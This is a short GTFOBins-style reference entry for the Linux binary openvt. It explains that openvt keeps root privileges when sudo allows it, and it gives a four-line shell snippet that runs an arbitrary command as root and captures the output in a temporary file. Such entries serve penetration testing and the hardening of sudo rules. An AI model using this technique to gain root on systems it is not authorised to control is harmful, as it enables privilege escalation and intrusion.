# GTFOBin: openvt

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.

```
COMMAND=id
TF=$(mktemp -u)
sudo openvt -- sh -c "$COMMAND >$TF 2>&1"
cat $TF
```